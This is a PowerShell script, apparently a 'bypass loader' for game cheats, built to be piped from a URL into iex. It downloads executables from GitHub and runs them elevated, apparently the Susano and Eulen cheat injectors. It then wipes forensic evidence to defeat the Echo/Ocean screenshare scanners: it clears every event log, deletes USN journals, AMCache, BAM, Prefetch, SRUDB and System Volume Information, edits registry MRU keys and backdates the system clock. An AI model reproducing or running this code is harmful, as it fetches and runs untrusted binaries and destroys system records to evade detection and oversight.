# Ghost Bypass Loader - Complete Echo/Ocean Bypass
# Run with: irm https://your-netlify-url.com/loader.ps1 | iex

# Disable history
Set-PSReadLineOption -HistorySaveStyle SaveNothing
Set-PSReadLineOption -HistorySearchCursorMovesToEnd:$false

# Clean download traces
function Clean-DownloadTraces {
    Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
    Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\*history*" -ErrorAction SilentlyContinue
    
    $runMru = Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -ErrorAction SilentlyContinue
    if ($null -ne $runMru) {
        $runMru | Get-Member -MemberType NoteProperty | Where-Object { $_.Name -notlike "MRUList*" } | 
            ForEach-Object { Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name $_.Name -ErrorAction SilentlyContinue }
    }
    
    Start-Process ipconfig -ArgumentList "/flushdns" -WindowStyle Hidden -Wait
    Start-Process netsh -ArgumentList "interface ip delete arpcache" -WindowStyle Hidden -Wait
    
    try { wevtutil cl "Windows PowerShell" /q:true /e:$false 2>$null } catch { }
    try { wevtutil cl "Microsoft-Windows-PowerShell/Operational" /q:true /e:$false 2>$null } catch { }
    
    Remove-Item "$env:TEMP\*.ps1" -ErrorAction SilentlyContinue
}

Clean-DownloadTraces

# Add assemblies
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = "GHOST BYPASS LOADER"
$form.Size = New-Object System.Drawing.Size(600, 700)
$form.StartPosition = "CenterScreen"
$form.BackColor = [System.Drawing.Color]::FromArgb(26, 26, 46)
$form.FormBorderStyle = "FixedSingle"
$form.MaximizeBox = $false

# Title
$titleLabel = New-Object System.Windows.Forms.Label
$titleLabel.Text = "GHOST BYPASS LOADER"
$titleLabel.Font = New-Object System.Drawing.Font("Helvetica", 20, [System.Drawing.FontStyle]::Bold)
$titleLabel.ForeColor = [System.Drawing.Color]::FromArgb(233, 69, 96)
$titleLabel.AutoSize = $true
$titleLabel.Location = New-Object System.Drawing.Point(150, 15)
$form.Controls.Add($titleLabel)

$subLabel = New-Object System.Windows.Forms.Label
$subLabel.Text = "Complete Echo/Ocean Bypass"
$subLabel.Font = New-Object System.Drawing.Font("Helvetica", 10)
$subLabel.ForeColor = [System.Drawing.Color]::FromArgb(136, 136, 136)
$subLabel.AutoSize = $true
$subLabel.Location = New-Object System.Drawing.Point(195, 45)
$form.Controls.Add($subLabel)

# Selection
$selectedOption = $null

$susanoBtn = New-Object System.Windows.Forms.Button
$susanoBtn.Text = "SUSANO"
$susanoBtn.Size = New-Object System.Drawing.Size(150, 55)
$susanoBtn.Location = New-Object System.Drawing.Point(30, 85)
$susanoBtn.BackColor = [System.Drawing.Color]::FromArgb(22, 33, 62)
$susanoBtn.ForeColor = [System.Drawing.Color]::White
$susanoBtn.FlatStyle = "Flat"
$susanoBtn.Font = New-Object System.Drawing.Font("Helvetica", 12, [System.Drawing.FontStyle]::Bold)
$susanoBtn.Add_Click({ 
    $script:selectedOption = "SUSANO"
    $susanoBtn.BackColor = [System.Drawing.Color]::FromArgb(233, 69, 96)
    $eulenBtn.BackColor = [System.Drawing.Color]::FromArgb(22, 33, 62)
    $selectedLabel.Text = "Selected: SUSANO"
    $injectBtn.Enabled = $true
    $extraBtn.Enabled = $true
    $statusLabel.Text = "Click INJECT or EXTRA METHOD"
})
$form.Controls.Add($susanoBtn)

$eulenBtn = New-Object System.Windows.Forms.Button
$eulenBtn.Text = "EULEN"
$eulenBtn.Size = New-Object System.Drawing.Size(150, 55)
$eulenBtn.Location = New-Object System.Drawing.Point(210, 85)
$eulenBtn.BackColor = [System.Drawing.Color]::FromArgb(22, 33, 62)
$eulenBtn.ForeColor = [System.Drawing.Color]::White
$eulenBtn.FlatStyle = "Flat"
$eulenBtn.Font = New-Object System.Drawing.Font("Helvetica", 12, [System.Drawing.FontStyle]::Bold)
$eulenBtn.Add_Click({ 
    $script:selectedOption = "EULEN"
    $eulenBtn.BackColor = [System.Drawing.Color]::FromArgb(233, 69, 96)
    $susanoBtn.BackColor = [System.Drawing.Color]::FromArgb(22, 33, 62)
    $selectedLabel.Text = "Selected: EULEN"
    $injectBtn.Enabled = $true
    $extraBtn.Enabled = $true
    $statusLabel.Text = "Click INJECT or EXTRA METHOD"
})
$form.Controls.Add($eulenBtn)

$selectedLabel = New-Object System.Windows.Forms.Label
$selectedLabel.Text = ""
$selectedLabel.ForeColor = [System.Drawing.Color]::FromArgb(0, 255, 136)
$selectedLabel.AutoSize = $true
$selectedLabel.Location = New-Object System.Drawing.Point(200, 155)
$form.Controls.Add($selectedLabel)

$injectBtn = New-Object System.Windows.Forms.Button
$injectBtn.Text = "INJECT"
$injectBtn.Size = New-Object System.Drawing.Size(330, 45)
$injectBtn.Location = New-Object System.Drawing.Point(105, 185)
$injectBtn.BackColor = [System.Drawing.Color]::FromArgb(233, 69, 96)
$injectBtn.ForeColor = [System.Drawing.Color]::White
$injectBtn.FlatStyle = "Flat"
$injectBtn.Font = New-Object System.Drawing.Font("Helvetica", 14, [System.Drawing.FontStyle]::Bold)
$injectBtn.Enabled = $false
$injectBtn.Add_Click({
    if ($selectedOption -eq "SUSANO") { 
        $exeUrl = "https://github.com/devil9064/GG/releases/download/GG/oasis.exe"
        $exePath = "$env:TEMP\oasis.exe"
    } else { 
        $exeUrl = "https://raw.githubusercontent.com/devil9064/GG/main/loader.client.exe"
        $exePath = "$env:TEMP\loader.client.exe"
    }
    
    $injectBtn.Enabled = $false
    $extraBtn.Enabled = $false
    $statusLabel.Text = "Downloading..."
    
    try {
        Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
    } catch {
        [System.Windows.Forms.MessageBox]::Show("Failed to download $selectedOption! Check anti-virus or GitHub link.", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
        $injectBtn.Enabled = $true
        $extraBtn.Enabled = $true
        return
    }

    $statusLabel.Text = "Launching..."
    
    Start-Process powershell -ArgumentList "-Command", "Start-Process '$exePath' -Verb RunAs -WorkingDirectory '$env:TEMP'" -WindowStyle Hidden
    Start-Sleep -Seconds 1
    
    $statusLabel.Text = "Injection successful!"
    [System.Windows.Forms.MessageBox]::Show("$selectedOption downloaded and injected!", "Success", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Info)
    
    $safeDistoryBtn.Enabled = $true
    $cleanTracesBtn.Enabled = $true
    $destroyBtn.Enabled = $true
})
$form.Controls.Add($injectBtn)

$extraBtn = New-Object System.Windows.Forms.Button
$extraBtn.Text = "EXTRA METHOD (Complete Bypass)"
$extraBtn.Size = New-Object System.Drawing.Size(330, 45)
$extraBtn.Location = New-Object System.Drawing.Point(105, 240)
$extraBtn.BackColor = [System.Drawing.Color]::FromArgb(155, 89, 182)
$extraBtn.ForeColor = [System.Drawing.Color]::White
$extraBtn.FlatStyle = "Flat"
$extraBtn.Font = New-Object System.Drawing.Font("Helvetica", 12, [System.Drawing.FontStyle]::Bold)
$extraBtn.Enabled = $false
$extraBtn.Add_Click({
    $result = [System.Windows.Forms.MessageBox]::Show("EXTRA METHOD will run COMPLETE bypass:`n- Kill process`n- Clean in-memory strings`n- Clean AMCache/BAM/Prefetch`n- Clean Echo/Ocean traces`n- Delete journals (backdated)`n- Clean all artifacts`n`nTakes ~60 seconds. Continue?", "Extra Method", [System.Windows.Forms.MessageBoxButtons]::YesNo, [System.Windows.Forms.MessageBoxIcon]::Warning)
    
    if ($result -eq "Yes") { Run-ExtraMethod }
})
$form.Controls.Add($extraBtn)

$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = "Select an option"
$statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(136, 136, 136)
$statusLabel.AutoSize = $true
$statusLabel.Location = New-Object System.Drawing.Point(200, 300)
$form.Controls.Add($statusLabel)

# Action buttons
$safeDistoryBtn = New-Object System.Windows.Forms.Button
$safeDistoryBtn.Text = "SAFE DISTORY"
$safeDistoryBtn.Size = New-Object System.Drawing.Size(145, 50)
$safeDistoryBtn.Location = New-Object System.Drawing.Point(30, 350)
$safeDistoryBtn.BackColor = [System.Drawing.Color]::FromArgb(46, 204, 113)
$safeDistoryBtn.ForeColor = [System.Drawing.Color]::White
$safeDistoryBtn.FlatStyle = "Flat"
$safeDistoryBtn.Font = New-Object System.Drawing.Font("Helvetica", 11, [System.Drawing.FontStyle]::Bold)
$safeDistoryBtn.Enabled = $false
$safeDistoryBtn.Add_Click({
    Kill-ProcessAndClean
    $statusLabel.Text = "Safe Distory Complete!"
    [System.Windows.Forms.MessageBox]::Show("Done!", "Success", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Info)
})
$form.Controls.Add($safeDistoryBtn)

$cleanTracesBtn = New-Object System.Windows.Forms.Button
$cleanTracesBtn.Text = "CLEAN TRACES"
$cleanTracesBtn.Size = New-Object System.Drawing.Size(145, 50)
$cleanTracesBtn.Location = New-Object System.Drawing.Point(195, 350)
$cleanTracesBtn.BackColor = [System.Drawing.Color]::FromArgb(52, 152, 219)
$cleanTracesBtn.ForeColor = [System.Drawing.Color]::White
$cleanTracesBtn.FlatStyle = "Flat"
$cleanTracesBtn.Font = New-Object System.Drawing.Font("Helvetica", 11, [System.Drawing.FontStyle]::Bold)
$cleanTracesBtn.Enabled = $false
$cleanTracesBtn.Add_Click({
    Clean-All-Traces
    $statusLabel.Text = "All traces cleaned!"
    [System.Windows.Forms.MessageBox]::Show("All traces cleaned!", "Success", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Info)
})
$form.Controls.Add($cleanTracesBtn)

$destroyBtn = New-Object System.Windows.Forms.Button
$destroyBtn.Text = "DESTROY LOADER"
$destroyBtn.Size = New-Object System.Drawing.Size(330, 50)
$destroyBtn.Location = New-Object System.Drawing.Point(105, 420)
$destroyBtn.BackColor = [System.Drawing.Color]::FromArgb(231, 76, 60)
$destroyBtn.ForeColor = [System.Drawing.Color]::White
$destroyBtn.FlatStyle = "Flat"
$destroyBtn.Font = New-Object System.Drawing.Font("Helvetica", 12, [System.Drawing.FontStyle]::Bold)
$destroyBtn.Enabled = $false
$destroyBtn.Add_Click({
    Kill-ProcessAndClean
    Clean-All-Traces
    $statusLabel.Text = "Loader Destroyed!"
    Start-Sleep -Seconds 1
    $form.Close()
})
$form.Controls.Add($destroyBtn)

# Info
$infoLabel = New-Object System.Windows.Forms.Label
$infoLabel.Text = "EXTRA METHOD = Complete bypass (in-memory + disk + artifacts)"
$infoLabel.Font = New-Object System.Drawing.Font("Helvetica", 9)
$infoLabel.ForeColor = [System.Drawing.Color]::FromArgb(100, 100, 100)
$infoLabel.AutoSize = $true
$infoLabel.Location = New-Object System.Drawing.Point(100, 490)
$form.Controls.Add($infoLabel)

# ============ COMPLETE BYPASS FUNCTIONS ============

function Run-ExtraMethod {
    $injectBtn.Enabled = $false
    $extraBtn.Enabled = $false
    $statusLabel.Text = "Running COMPLETE BYPASS..."
    
    # Step 1: Kill process
    Kill-ProcessAndClean
    Start-Sleep -Seconds 1
    
    # Step 2: Complete bypass sequence
    try {
        # Get dates
        $current = Get-Date
        $pastDate = $current.AddDays(-3)
        $futureDate = $current.AddDays(1)
        
        # Stop services
        $statusLabel.Text = "1. Stopping services..."
        Start-Process powershell -ArgumentList "-Command", "Get-Service -Name 'W32Time' | Stop-Service -Force" -Verb RunAs -WindowStyle Hidden -Wait
        Start-Process powershell -ArgumentList "-Command", "net stop diagtrack /y" -Verb RunAs -WindowStyle Hidden -Wait
        Start-Process powershell -ArgumentList "-Command", "net stop pcasv /y" -Verb RunAs -WindowStyle Hidden -Wait
        Start-Process powershell -ArgumentList "-Command", "net stop dps /y" -Verb RunAs -WindowStyle Hidden -Wait
        
        # Clean Echo/Ocean temp files
        $statusLabel.Text = "2. Cleaning Echo/Ocean temp files..."
        $echoTemp = "$env:LOCALAPPDATA\Temp\echo*"
        $oceanTemp = "$env:LOCALAPPDATA\Temp\a3.exe"
        $oceanTemp2 = "$env:LOCALAPPDATA\Temp\*9813*"
        $oceanTemp3 = "$env:LOCALAPPDATA\Temp\*27258*"
        
        Remove-Item $echoTemp -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item $oceanTemp -Force -ErrorAction SilentlyContinue
        Remove-Item $oceanTemp2 -Force -ErrorAction SilentlyContinue
        Remove-Item $oceanTemp3 -Force -ErrorAction SilentlyContinue
        
        # Clean AMCache
        $statusLabel.Text = "3. Cleaning AMCache..."
        $amcache = "C:\Windows\appcompat\Programs\AMCache.hve"
        if (Test-Path $amcache) {
            try { 
                # Try to rename/delete
                $backup = "$amcache.backup_$(Get-Date -Format 'yyyyMMddHHmmss')"
                Rename-Item $amcache $backup -Force -ErrorAction SilentlyContinue
            } catch { }
        }
        
        # Clean BAM
        $statusLabel.Text = "4. Cleaning BAM..."
        try {
            $bamPath = "HKLM:\SYSTEM\CurrentControlSet\Services\bam\UserSettings"
            if (Test-Path $bamPath) {
                # Get current user SID
                $sid = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\*" | Where-Object { $_.ProfileImagePath -match $env:USERNAME }).PSChildName
                if ($sid) {
                    Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\bam\UserSettings\$sid" -Name "*" -ErrorAction SilentlyContinue
                }
            }
        } catch { }
        
        # Clean Prefetch
        $statusLabel.Text = "5. Cleaning Prefetch..."
        $prefetch = "C:\Windows\Prefetch"
        $exeName = if ($selectedOption -eq "SUSANO") { "OASIS" } else { "LOADER" }
        $keywords = @("SUSANO", "EULEN", "OASIS", "LOADER", "ECHO", "OCEAN", "STORM", "LAVENDER", "POWERSHELL", "WMIC", "CMD", "RUNDLL32")
        
        if (Test-Path $prefetch) {
            Get-ChildItem $prefetch -File | Where-Object { 
                $name = $_.Name.ToUpper()
                ($keywords | Where-Object { $name -match $_ }).Count -gt 0
            } | Remove-Item -Force -ErrorAction SilentlyContinue
        }
        
        # Clean in-memory strings (process hollowing prevention)
        $statusLabel.Text = "6. Cleaning in-memory strings..."
        Clean-InMemoryStrings
        
        # Delete SRUDB
        $statusLabel.Text = "7. Cleaning SRU..."
        Start-Process cmd -ArgumentList "/c del /f /q C:\Windows\System32\sru\SRUDB.dat" -Verb RunAs -WindowStyle Hidden -Wait
        
        # Clean registry
        $statusLabel.Text = "8. Cleaning registry..."
        Start-Process cmd -ArgumentList '/c reg delete "HKEY_CURRENT_USER\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" /f' -Verb RunAs -WindowStyle Hidden -Wait
        Start-Process cmd -ArgumentList '/c reg delete "HKEY_CURRENT_USER\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU" /f' -Verb RunAs -WindowStyle Hidden -Wait
        Start-Process cmd -ArgumentList '/c reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\Shell\BagMRU" /f' -Verb RunAs -WindowStyle Hidden -Wait
        
        # Clear System Volume
        $statusLabel.Text = "9. Cleaning System Volume..."
        Start-Process cmd -ArgumentList "/c del /s /f /a:h /a:a /q %systemdrive%\System Volume Information\*.*" -Verb RunAs -WindowStyle Hidden -Wait
        
        # Backdate (trick scanner)
        $statusLabel.Text = "10. Backdating system..."
        $pastStr = $pastDate.ToString('MM/dd/yyyy')
        Start-Process powershell -ArgumentList "-Command", "Set-Date -Date '$pastStr'" -Verb RunAs -WindowStyle Hidden -Wait
        
        # Delete journals
        $statusLabel.Text = "11. Deleting journals..."
        Start-Process fsutil -ArgumentList "usn deletejournal /d C:" -Verb RunAs -WindowStyle Hidden -Wait
        Start-Process fsutil -ArgumentList "usn deletejournal /d D:" -Verb RunAs -WindowStyle Hidden -Wait
        
        # Clear event logs
        $statusLabel.Text = "12. Clearing event logs..."
        Start-Process powershell -ArgumentList "-Command", "wevtutil el | ForEach-Object { wevtutil cl `$_ }" -Verb RunAs -WindowStyle Hidden -Wait
        
        # Clean PowerShell history
        $statusLabel.Text = "13. Cleaning history..."
        $histPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
        Remove-Item $histPath -Force -ErrorAction SilentlyContinue
        
        # Restore date
        $statusLabel.Text = "14. Restoring date..."
        $futureStr = $futureDate.ToString('MM/dd/yyyy')
        Start-Process powershell -ArgumentList "-Command", "Start-Sleep -Seconds 3; Set-Date -Date '$futureStr'" -Verb RunAs -WindowStyle Hidden -Wait
        
        # Restart services
        $statusLabel.Text = "15. Restarting services..."
        Start-Process powershell -ArgumentList "-Command", "sc config DiagTrack start= auto; sc start DiagTrack" -Verb RunAs -WindowStyle Hidden -Wait
        Start-Process powershell -ArgumentList "-Command", "Get-Service -Name 'W32Time' | Start-Service" -Verb RunAs -WindowStyle Hidden -Wait
        Start-Process powershell -ArgumentList "-Command", "Get-Service -Name 'dps' | Start-Service" -Verb RunAs -WindowStyle Hidden -Wait
        
        # Create new journals
        $statusLabel.Text = "16. Creating new journals..."
        Start-Process fsutil -ArgumentList "usn createjournal m=67108864 a=8388608 C:" -Verb RunAs -WindowStyle Hidden -Wait
        Start-Process fsutil -ArgumentList "usn createjournal m=67108864 a=8388608 D:" -Verb RunAs -WindowStyle Hidden -Wait
        
        # Final cleanup
        Clean-All-Traces
        
        $statusLabel.Text = "COMPLETE BYPASS DONE!"
        [System.Windows.Forms.MessageBox]::Show("Complete Echo/Ocean Bypass Done!`n`nLaunching loader...", "Success", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Info)
        
        # Launch loader by checking which payload they successfully used
        if ($selectedOption -eq "SUSANO") { $exePath = "$env:TEMP\oasis.exe" }
        else { $exePath = "$env:TEMP\loader.client.exe" }
        
        Start-Process powershell -ArgumentList "-Command", "Start-Process '$exePath' -Verb RunAs -WorkingDirectory '$env:TEMP'" -WindowStyle Hidden
        
        $safeDistoryBtn.Enabled = $true
        $cleanTracesBtn.Enabled = $true
        $destroyBtn.Enabled = $true
        
    } catch {
        [System.Windows.Forms.MessageBox]::Show("Error: $_", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
    }
}

function Clean-InMemoryStrings {
    # Clean strings from memory in various processes
    # This uses a simpler approach - restart services to clear memory
    
    $servicesToRestart = @("DiagTrack", "W32Time", "SysMain")
    
    foreach ($svc in $servicesToRestart) {
        try {
            # Restart service to clear memory
            Restart-Service -Name $svc -Force -ErrorAction SilentlyContinue
        } catch { }
    }
    
    # Clear clipboard
    [System.Windows.Forms.Clipboard]::Clear()
    
    # Flush DNS and ARP
    Start-Process ipconfig -ArgumentList "/flushdns" -WindowStyle Hidden -Wait
    Start-Process netsh -ArgumentList "interface ip delete arpcache" -WindowStyle Hidden -Wait
}

function Kill-ProcessAndClean {
    $processName = if ($selectedOption -eq "SUSANO") { "oasis.exe" } else { "loader.client.exe" }
    
    Get-Process -Name $processName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 500
    Get-Process -Name $processName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
}

function Clean-All-Traces {
    # Clipboard
    [System.Windows.Forms.Clipboard]::Clear()
    
    # DNS/ARP
    Start-Process ipconfig -ArgumentList "/flushdns" -WindowStyle Hidden -Wait
    Start-Process netsh -ArgumentList "interface ip delete arpcache" -WindowStyle Hidden -Wait
    
    # Temp files
    Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:LOCALAPPDATA\Temp\*" -Recurse -Force -ErrorAction SilentlyContinue
    
    # Recent
    $recentPath = "$env:APPDATA\Microsoft\Windows\Recent"
    if (Test-Path $recentPath) {
        $keywords = @("SUSANO", "EULEN", "OASIS", "LOADER", "GHOST", "BYPASS", "ECHO", "OCEAN", "STORM", "A3", "TEMP")
        Get-ChildItem $recentPath -File | Where-Object { 
            $name = $_.Name.ToUpper()
            ($keywords | Where-Object { $name -match $_ }).Count -gt 0
        } | Remove-Item -Force -ErrorAction SilentlyContinue
    }
    
    # Prefetch
    $prefetch = "C:\Windows\Prefetch"
    if (Test-Path $prefetch) {
        $keywords = @("SUSANO", "EULEN", "OASIS", "LOADER", "ECHO", "OCEAN", "STORM", "LAVENDER", "POWERSHELL", "WMIC")
        Get-ChildItem $prefetch -File | Where-Object { 
            $name = $_.Name.ToUpper()
            ($keywords | Where-Object { $name -match $_ }).Count -gt 0
        } | Remove-Item -Force -ErrorAction SilentlyContinue
    }
    
    # Echo/Ocean specific
    Remove-Item "$env:LOCALAPPDATA\Temp\echo*" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:LOCALAPPDATA\Temp\a3.exe" -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:LOCALAPPDATA\Temp\*9813*" -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:LOCALAPPDATA\Temp\*27258*" -Force -ErrorAction SilentlyContinue
}

$form.ShowDialog()
